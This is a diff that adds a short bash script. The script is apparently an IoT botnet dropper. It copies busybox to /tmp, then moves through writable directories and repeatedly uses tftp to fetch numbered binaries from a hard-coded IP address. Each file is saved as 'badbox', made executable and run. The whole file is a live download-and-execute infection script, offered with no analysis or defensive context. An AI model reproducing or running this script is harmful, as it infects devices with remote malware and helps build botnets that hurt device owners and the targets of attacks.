@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX1 -g 185.145.131.173;cat SEX1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX2 -g 185.145.131.173;cat SEX2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX4 -g 185.145.131.173;cat SEX4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX3 -g 185.145.131.173;cat SEX3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX5 -g 185.145.131.173;cat SEX5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX6 -g 185.145.131.173;cat SEX6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX7 -g 185.145.131.173;cat SEX7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX8 -g 185.145.131.173;cat SEX8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX9 -g 185.145.131.173;cat SEX9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX10 -g 185.145.131.173;cat SEX10 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX11 -g 185.145.131.173;cat SEX11 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX12 -g 185.145.131.173;cat SEX12 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r SEX13 -g 185.145.131.173;cat SEX13 >badbox;chmod +x *;./badbox
